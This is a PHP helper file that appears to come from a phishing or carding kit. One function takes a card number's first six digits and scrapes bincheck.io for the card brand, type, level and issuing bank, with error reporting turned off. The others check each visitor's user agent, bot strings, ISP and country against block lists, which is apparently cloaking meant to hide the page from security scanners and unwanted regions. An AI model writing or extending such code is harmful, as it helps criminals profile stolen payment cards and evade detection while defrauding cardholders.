<?php

function look_bin($num) {
    error_reporting(0);
    $num = str_replace(' ', '', trim($num));
    $num = substr($num, 0, 6);
    $url = "https://bincheck.io/id/details/$num";
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    libxml_use_internal_errors(true);
    $dom->loadHTML($html);
    $xpath = new DOMXPath($dom);
    $rows = $xpath->query('//tr');
    $data = [];

    foreach ($rows as $row) {
        $cols = $xpath->query('.//td', $row);
        if ($cols->length == 2) {
            $label = trim($cols[0]->nodeValue);
            $value = trim($cols[1]->nodeValue);
            $data[$label] = $value;
        }
    }

    $brand = $data['Merek Kartu'] ?? "unknown brand";
    $type = $data['Tipe kartu'] ?? "unknown type";
    $level = $data['Tingkat Kartu'] ?? "unknown level";
    $bank = $data['Nama Penerbit / Bank'] ?? "unknown bank";
    $result = strtoupper("$num $brand $type $level $bank");

    return $result;
}


function isUserAgentBlocked() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $blockedFile = "App/System/blocked_user_agents.txt";
    $blockedAgents = file($blockedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($userAgent, $blockedAgents);
}

function isBotBlocked() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $blockedFile = "App/System/blocked_bots.txt";
    $blockedBots = file($blockedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($blockedBots as $botAgent) {
        if (stripos($userAgent, $botAgent) !== false) {
            return true;
        }
    }
    return false;
}

function isIsPBlocked($isp) {
    $blockedFile = "App/System/blocked_isp.txt";
    $blockedIsp = file($blockedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($isp, $blockedIsp);
}

function isLockCountry($code) {
    $lockcodefile = "App/System/lockcountry.txt";
    $lockcountrycode = file($lockcodefile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return in_array($code, $lockcountrycode);
}
